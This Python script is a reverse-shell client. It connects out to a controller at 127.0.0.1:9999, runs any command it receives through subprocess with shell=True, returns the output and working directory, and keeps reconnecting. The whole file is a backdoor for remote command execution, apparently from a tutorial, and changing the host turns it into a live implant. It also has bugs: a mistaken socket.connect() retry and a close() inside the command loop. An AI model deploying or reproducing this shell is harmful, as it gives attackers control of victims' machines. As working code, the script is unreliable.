import os
import socket
import subprocess
import time


def socket_create():
    try:
        global host, port, s
        s = socket.socket()
        host = '127.0.0.1'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ',str(msg))
        
def socket_connect():
    try:
        global host, port, s
        s.connect((host,port))
    except socket.error as msg:
        print(f'Socket connection error: {msg}')
        time.sleep(5)
        socket.connect()

def receive_commands():
    while True:
        data = s.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            try:
                os.chdir(data[3:].decode('utf-8'))
            except:
                pass
        if data[:].decode('utf-8') == 'quit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')
                s.send(str.encode(output_str+ str(os.getcwd())+ '>'))
                print(output_str)
            except:
                out_put = "Command not recognized \n"
                s.send(str.encode(out_put+str(os.getcwd())+ '>'))
                print(out_put)
                
        s.close()

def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except Exception as e:
        print('Error in main', e)
        time.sleep(5)
    s.close()
    main()

main()



